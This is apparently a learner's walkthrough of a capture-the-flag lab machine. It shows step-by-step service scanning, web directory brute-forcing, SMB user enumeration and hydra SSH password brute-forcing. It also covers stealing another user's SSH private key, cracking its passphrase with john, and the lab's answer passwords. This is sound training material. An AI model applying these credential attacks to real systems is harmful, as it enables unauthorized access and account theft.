Started 6/11/2024
1. Find the services exposed by the machine
To do this we can use an nmap scan and use the tag -sV to look at versions:
$ nmap -sV -sC -v 10.10.109.43 
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.7
| fingerprint-strings: 
|   LANDesk-RC: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Wed, 12 Jun 2024 01:56:48 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
|   SIPOptions: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2154
|     Date: Wed, 12 Jun 2024 01:56:48 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=6/11%Time=6669005E%P=x86_64-pc-linux-gnu%r
SF:(SIPOptions,906,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;cha
SF:rset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x202154\r\nDat
SF:e:\x20Wed,\x2012\x20Jun\x202024\x2001:56:48\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20
SF:Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\
SF:"text/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;back
SF:ground-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Aria
SF:l,sans-serif;color:white;background-color:#525D76;font-size:16px;}\x20h
SF:3\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-color:
SF:#525D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-seri
SF:f;color:black;background-color:white;}\x20b\x20{font-family:Tahoma,Aria
SF:l,sans-serif;color:white;background-color:#525D76;}\x20p\x20{font-famil
SF:y:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}
SF:\x20a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{heig
SF:ht:1px;background-color:#525D76;border:none;}</style></head><bod")%r(LA
SF:NDesk-RC,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charse
SF:t=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\
SF:x20Wed,\x2012\x20Jun\x202024\x2001:56:48\x20GMT\r\nConnection:\x20close
SF:\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Sta
SF:tus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"te
SF:xt/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgro
SF:und-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,s
SF:ans-serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x
SF:20{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#52
SF:5D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;c
SF:olor:black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,s
SF:ans-serif;color:white;background-color:#525D76;}\x20p\x20{font-family:T
SF:ahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}\x2
SF:0a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:
SF:1px;background-color:#525D76;border:none;}</style></head><bod");
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-06-11T21:56:51-04:00
| smb2-time: 
|   date: 2024-06-12T01:56:50
|_  start_date: N/A

2. What is the name of the hidden directory on the web server(enter name without /)?
For this we can use dirbuster
$ dirb http://10.10.109.43 -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jun 11 22:00:34 2024
URL_BASE: http://10.10.109.43/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Printing LOCATION header

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.109.43/ ----
==> DIRECTORY: http://10.10.109.43/development/
We found that the directory is development

3. User brute-forcing to find the username & password
Navigating to the development page... there is nothing there so I will check the ports to see if there is anything that's brute-forceable.
Noticing the smb ports open you can most likely use enum4linux in /usr/share to find users through the smb port:
$ /usr/share/enum4linux/enum4linux.pl -a 10.10.109.43
S-1-22-1-1000 Unix User\kay (Local User)                                                         
S-1-22-1-1001 Unix User\jan (Local User)
Now that we have the username we can use hydra to bruteforce for the password:
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.109.43
It said that the password was week in the devlogs on the development page so rockyou should do the trick

4. What is the Username - Jan (found from enum4linux)
5. What is the password - 
6. What service do you use to access the server(answer in abbreviation in all caps)? -SSH
7. Enumerate the machine to find any vectors for privilege escalation 
In order to enumerate we couldn't write to a file using wget or curl so we use scp: 
$ scp ./LinEnum.sh jan@10.10.109.43:/dev/shm                       
jan@10.10.109.43's password: 
LinEnum.sh                                                     100%   46KB 143.0KB/s   00:00

And then we run on jan's computer... First we must make it executable:
$ cd /dev/shm
$ chmod +x LinEnum.sh
$ ./LinEnum.sh
Using LinPeas doing this same method you find the ssh private key
We can go over and read the private key and copy it to a file on our machine
ssh likes to accept only read only files so we do
chmod 600 tmpkey.txt
we try sshing using the file
ssh -i tmpkey.txt kay@10.10.109.43
it asks for a passphrase
We go back and do ssh2john.py and get a hash that john can read and export it to a tmp file using > 
using john crack the passphrase
john tmp.txt --wordlist=/usr/share/wordlists/rockyou.txt
This gives us passphrase: beeswax
We can now ssh back in as kay and read the password which gives us:
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

8. What is the name of the other user you found(all lower case)? - kay
9. If you have found another user, what can you do with this information? - Parallel movement to other user accounts. 
10.What is the final password you obtain: heresareallystrongpasswordthatfollowsthepasswordpolicy$$

